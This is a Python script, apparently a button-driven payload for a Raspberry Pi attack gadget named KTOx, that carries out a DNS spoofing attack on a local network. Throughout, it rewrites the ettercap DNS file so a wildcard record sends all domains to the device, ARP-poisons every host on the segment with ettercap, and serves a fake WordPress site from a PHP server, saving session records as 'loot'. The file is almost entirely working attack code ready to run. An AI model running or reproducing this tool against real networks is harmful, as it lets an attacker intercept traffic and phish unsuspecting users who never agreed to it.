#!/usr/bin/env python3
"""
KTOx *payload* – **Ettercap DNS Spoofing Attack**
====================================================
This payload launches an Ettercap DNS spoofing attack, redirecting DNS queries
to a specified IP address (typically the KTOx's own IP) to serve fake
web pages. It dynamically selects the best network interface and provides
a simple UI on the 1.44-inch LCD to start and stop the attack.

Features:
- Dynamically selects the best available network interface.
- Modifies `/etc/ettercap/etter.dns` to point target domains to KTOx's IP.
- Launches `ettercap` in text mode for ARP spoofing and DNS spoofing.
- Provides LCD feedback on attack status.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- KEY1: Start DNS Spoofing Attack
- KEY2: Stop DNS Spoofing Attack
- KEY3: Exit Payload
"""

import sys
import os
import time
import signal
import subprocess
import threading
import re

# ----------------------------
# KTOx PATH and ROOT check
# ----------------------------
def is_root():
    return os.geteuid() == 0

# Prefer /root/KTOx for imports; fallback to repo-relative KTOx sibling
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
# Also add wifi subdir if present
_wifi_dir = os.path.join(KTOX_ROOT, 'wifi')
if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
    sys.path.insert(0, _wifi_dir)

# ----------------------------
# Third-party library imports 
# ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    import netifaces
except ImportError as e:
    print(f"ERROR: A required library is not found. {e}", file=sys.stderr)
    print("Please run 'sudo pip3 install RPi.GPIO spidev Pillow netifaces'.", file=sys.stderr)
    sys.exit(1)

# ----------------------------
# KTOx WiFi Integration
# ----------------------------
try:
    from wifi.ktox_integration import get_best_interface, get_dns_spoof_ip
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_best_interface():
        return "eth0" # Fallback
    def get_dns_spoof_ip(interface):
        try:
            return subprocess.check_output(f"ip -4 addr show {interface} | awk '/inet / {{split($2, a, \"/\"); print a[1]}}'", shell=True).decode().strip()
        except:
            return None

PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# Dynamically get the best interface
NETWORK_INTERFACE = get_best_interface()
ETTERCAP_DNS_FILE = "/etc/ettercap/etter.dns"
SPOOF_SITE_WEBROOT = os.path.join(KTOX_ROOT, "DNSSpoof", "sites", "wordpress") # Default spoof site
running = True
ettercap_process = None
php_server_process = None

LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'attack_ettercap_dns')

def _find_ettercap() -> str:
    """Return the correct ettercap binary name for this system.
    Kali installs the text-only build as 'ettercap-text-only'; some
    systems use 'ettercap' or 'ettercap-text'.  Falls back to 'ettercap'
    so error messages stay meaningful."""
    for name in ("ettercap", "ettercap-text-only", "ettercap-text"):
        if subprocess.run(["which", name], capture_output=True).returncode == 0:
            return name
    return "ettercap"

ETTERCAP_BIN = _find_ettercap()
os.makedirs(LOOT_DIR, exist_ok=True)
LAST_SPOOF_IP = None

def draw(lines, color="lime"):
    """Clear the screen and draw text lines, centering each line."""
    if isinstance(lines, str):
        lines = [lines]
    
    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
    d = ImageDraw.Draw(img)
    
    y_offset = (HEIGHT - len(lines) * 15) // 2 # Center vertically
    
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=FONT_TITLE)
        w = bbox[2] - bbox[0]
        x = (WIDTH - w) // 2 # Center horizontally
        d.text((x, y_offset), line, font=FONT_TITLE, fill=color)
        y_offset += 15 # Line spacing
    
    LCD.LCD_ShowImage(img, 0, 0)

def cleanup(*_):
    """Signal handler: stop the main loop and perform cleanup."""
    global running
    running = False
    stop_dns_spoofing() # Ensure processes are killed on exit
    save_loot_snapshot(status="cleanup")

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def save_loot_snapshot(status="", spoof_ip=None):
    try:
        ts = time.strftime('%Y-%m-%d_%H%M%S')
        loot_file = os.path.join(LOOT_DIR, f"ettercap_dns_{ts}.txt")
        with open(loot_file, 'w') as f:
            f.write("Ettercap DNS Spoof Session\n")
            f.write(f"Interface: {NETWORK_INTERFACE}\n")
            f.write(f"Spoof IP: {spoof_ip or LAST_SPOOF_IP or 'N/A'}\n")
            f.write(f"Status: {status}\n")
            f.write(f"Timestamp: {ts}\n")
        print(f"Loot saved to {loot_file}")
    except Exception as e:
        print(f"Loot save failed: {e}", file=sys.stderr)

def get_default_gateway_ip():
    """Get the default gateway IP address."""
    try:
        gws = netifaces.gateways()
        return gws['default'][netifaces.AF_INET][0]
    except Exception:
        return None

def modify_etter_dns(target_ip):
    """Modify /etc/ettercap/etter.dns to point all A records to target_ip."""
    try:
        with open(ETTERCAP_DNS_FILE, 'r') as f:
            lines = f.readlines()
        
        new_lines = []
        for line in lines:
            # Replace existing IP addresses in A records, or add new ones
            if re.match(r'^\s*(\*\s+A\s+)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
                new_lines.append(f"*. A {target_ip}\n")
            elif re.match(r'^\s*(\*\s+PTR\s+)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line):
                # PTR records are for reverse DNS, usually not spoofed in this context
                new_lines.append(line)
            elif line.strip().startswith('#') or not line.strip():
                new_lines.append(line)
            else:
                # For other records, ensure they point to the target_ip if they are A records
                parts = line.split()
                if len(parts) >= 2 and parts[1] == 'A':
                    new_lines.append(f"{parts[0]} A {target_ip}\n")
                else:
                    new_lines.append(line)
        
        # Ensure a wildcard entry exists
        if not any(re.match(r'^\*\s+A\s+', l) for l in new_lines):
            new_lines.insert(0, f"*. A {target_ip}\n")
            
        with open(ETTERCAP_DNS_FILE, 'w') as f:
            f.writelines(new_lines)
        return True
    except Exception as e:
        draw([f"Error modifying", f"etter.dns: {str(e)[:15]}"], "red")
        print(f"Error modifying etter.dns: {e}", file=sys.stderr)
        return False

def start_dns_spoofing():
    """Start the Ettercap DNS spoofing attack and PHP web server."""
    global ettercap_process, php_server_process
    
    draw(["Starting DNS", "Spoofing..."])
    
    # 1. Get KTOx's IP for DNS redirection
    ktox_ip = get_dns_spoof_ip(NETWORK_INTERFACE)
    if not ktox_ip:
        draw(["Error: No IP", f"on {NETWORK_INTERFACE}"], "red")
        time.sleep(3)
        return False
    global LAST_SPOOF_IP
    LAST_SPOOF_IP = ktox_ip
    
    # 2. Modify etter.dns
    if not modify_etter_dns(ktox_ip):
        return False
    
    # 3. Kill any existing ettercap or php processes
    subprocess.run("pkill -f 'ettercap'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("pkill -f 'php'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1) # Give processes time to terminate
    
    # 4. Launch PHP web server for the spoofed site
    if os.path.isdir(SPOOF_SITE_WEBROOT):
        draw(["Starting PHP", "Server..."])
        try:
            php_server_process = subprocess.Popen(
                f"cd {SPOOF_SITE_WEBROOT} && php -S {ktox_ip}:80",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid # Start in a new session to avoid being killed by parent
            )
            time.sleep(1) # Give server time to start
            if php_server_process.poll() is not None: # Check if it crashed
                draw(["PHP Server", "Failed to start!"], "red")
                time.sleep(3)
                return False
        except Exception as e:
            draw(["PHP Server", f"Error: {str(e)[:15]}"], "red")
            print(f"Error starting PHP server: {e}", file=sys.stderr)
            return False
    else:
        draw(["Warning: No webroot", "for spoofed site!"], "yellow")
        time.sleep(2)
    
    # 5. Launch Ettercap
    draw(["Starting Ettercap", "DNS Spoof..."])
    try:
        # Ettercap command for ARP spoofing and DNS spoofing
        # -Tq: text mode, quiet
        # -M arp:remote: ARP spoofing all hosts on the segment
        # -P dns_spoof: enable dns_spoof plugin
        # -i <interface>: specify interface
        ettercap_command = [
            ETTERCAP_BIN, "-Tq", "-M", "arp:remote", "-P", "dns_spoof", "-i", NETWORK_INTERFACE
        ]
        ettercap_process = subprocess.Popen(
            ettercap_command,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid # Start in a new session
        )
        time.sleep(2) # Give ettercap time to start
        if ettercap_process.poll() is not None: # Check if it crashed
            draw(["Ettercap", "Failed to start!"], "red")
            time.sleep(3)
            return False
        
        draw(["DNS Spoofing", "ACTIVE!", f"IP: {ktox_ip}"], "green")
        save_loot_snapshot(status="started", spoof_ip=ktox_ip)
        return True
    except Exception as e:
        draw(["Ettercap", f"Error: {str(e)[:15]}"], "red")
        print(f"Error starting Ettercap: {e}", file=sys.stderr)
        return False

def stop_dns_spoofing():
    """Stop the Ettercap DNS spoofing attack and PHP web server."""
    global ettercap_process, php_server_process
    
    draw(["Stopping DNS", "Spoofing..."])
    
    if ettercap_process and ettercap_process.poll() is None:
        try:
            os.killpg(os.getpgid(ettercap_process.pid), signal.SIGTERM)
            ettercap_process.wait(timeout=5)
            print("Ettercap stopped.")
        except (subprocess.TimeoutExpired, ProcessLookupError):
            ettercap_process.kill()
            print("Ettercap killed.")
        ettercap_process = None
    
    if php_server_process and php_server_process.poll() is None:
        try:
            os.killpg(os.getpgid(php_server_process.pid), signal.SIGTERM)
            php_server_process.wait(timeout=5)
            print("PHP server stopped.")
        except (subprocess.TimeoutExpired, ProcessLookupError):
            php_server_process.kill()
            print("PHP server killed.")
        php_server_process = None
    
    # Restore original etter.dns (if a backup was made, or just a default one)
    # For simplicity, we'll just ensure the wildcard entry is removed or reset
    # A more robust solution would involve backing up the original file.
    try:
        with open(ETTERCAP_DNS_FILE, 'r') as f:
            lines = f.readlines()
        
        new_lines = [line for line in lines if not re.match(r'^\*\s+A\s+', line)]
        
        with open(ETTERCAP_DNS_FILE, 'w') as f:
            f.writelines(new_lines)
        print("etter.dns reset.")
    except Exception as e:
        print(f"Error resetting etter.dns: {e}", file=sys.stderr)
        
    draw(["DNS Spoofing", "STOPPED."], "yellow")
    save_loot_snapshot(status="stopped")
    time.sleep(2)

def check_dependencies():
    """Check for required command-line tools."""
    for dep in [ETTERCAP_BIN, "php"]:
        if subprocess.run(["which", dep], capture_output=True).returncode != 0:
            return dep
    return None

if __name__ == '__main__':
    if not is_root():
        print("ERROR: This script requires root privileges.", file=sys.stderr)
        # Attempt to display on LCD if possible
        try:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            img = Image.new("RGB", (128, 128), (10, 0, 0))
            d = ImageDraw.Draw(img)
            FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
            d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception as e:
            print(f"Could not display error on LCD: {e}", file=sys.stderr)
        sys.exit(1)

    dep_missing = check_dependencies()
    if dep_missing:
        draw([f"ERROR:", f"{dep_missing} not found."], "red")
        time.sleep(5)
        sys.exit(1)

    try:
        draw(["DNS Spoofing", "Ready", "KEY1: Start", "KEY2: Stop", "KEY3: Exit"])
        
        while running:
            btn = None
            for name, pin in PINS.items():
                if GPIO.input(pin) == 0:
                    btn = name
                    # Basic debouncing
                    while GPIO.input(pin) == 0:
                        time.sleep(0.05)
                    break
            
            if btn == "KEY1":
                start_dns_spoofing()
            elif btn == "KEY2":
                stop_dns_spoofing()
            elif btn == "KEY3":
                cleanup()
            
            time.sleep(0.05) # Reduce CPU usage
            
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw([f"CRITICAL ERROR:", f"{str(e)[:20]}"], "red")
        time.sleep(3)
    finally:
        stop_dns_spoofing() # Ensure all processes are killed
        save_loot_snapshot(status="finalize")
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Ettercap DNS Spoofing payload finished.")
